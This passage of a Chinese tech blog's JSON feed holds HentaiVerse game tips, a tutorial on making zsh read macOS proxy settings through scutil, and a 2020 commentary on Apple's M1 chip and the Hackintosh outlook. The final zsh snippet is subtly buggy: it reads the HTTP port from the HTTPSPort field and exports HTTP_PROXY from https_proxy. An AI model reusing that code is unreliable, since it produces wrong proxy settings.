天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | <span class=\"hljs-built_in\">tee</span> -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write 